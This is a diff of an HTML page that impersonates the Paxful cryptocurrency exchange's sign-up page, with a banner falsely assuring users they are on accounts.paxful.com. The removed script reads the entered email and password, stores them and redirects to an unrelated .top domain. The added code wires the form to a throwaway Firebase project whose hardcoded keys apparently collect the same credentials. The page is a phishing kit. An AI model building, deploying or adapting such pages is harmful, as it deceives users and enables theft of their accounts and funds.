@@ -54,7 +54,7 @@
           <p><img src="https://img.icons8.com/ios-filled/50/007bff/info.png" alt="Info" width="20" height="20"> IMPORTANT! Please check that you are visiting https://accounts.paxful.com/<span class="url"><img src="https://img.icons8.com/ios-filled/50/00cc66/lock--v1.png" alt="Lock" width="20" height="20"> https://accounts.paxful.com/</span></p>
       </div><br>
 
-        <form class="login-form" id="registrationForm" onsubmit="storeCredentials(event)">
+        <form class="login-form" id="registrationForm">
             <label for="phone-email">Your Phone or Email</label>
             <input type="email" id="email" name="phone-email" required>
             
@@ -72,21 +72,27 @@
             <p>Already have an account? <a href="#">Log In</a></p>
         </div>
     </div>
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-auth.js'
 
-    <script type="text/javascript">
-      function storeCredentials(event) {
-          event.preventDefault(); // Prevent the form from submitting normally
-
-          const email = document.getElementById('email').value;
-          const password = document.getElementById('password').value;
-
-          // Store credentials in localStorage
-          localStorage.setItem('email', email);
-          localStorage.setItem('password', password);
-
-          // Redirect to the specified URL
-          window.location.href = "https://approximatereservoir.top/45f0Xkh4Q3lXeXJRRwYnRVcGJEddDChbCXhkBAoDBioaK1Y6biMDCDtQIXtlag?1718686957216";
-      }
-    </script>
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+      
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyAmcoqzwoblwciG9x5zd-WQipe3c9bIE6k",
+          authDomain: "qwertyqwe-da842.firebaseapp.com",
+          projectId: "qwertyqwe-da842",
+          storageBucket: "qwertyqwe-da842.appspot.com",
+          messagingSenderId: "607214606288",
+          appId: "1:607214606288:web:ff464cc3b08ac71cd10bd5"
+        };
+      
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+      </script>
+    <script src="main.js"></script>
 </body>
 </html>
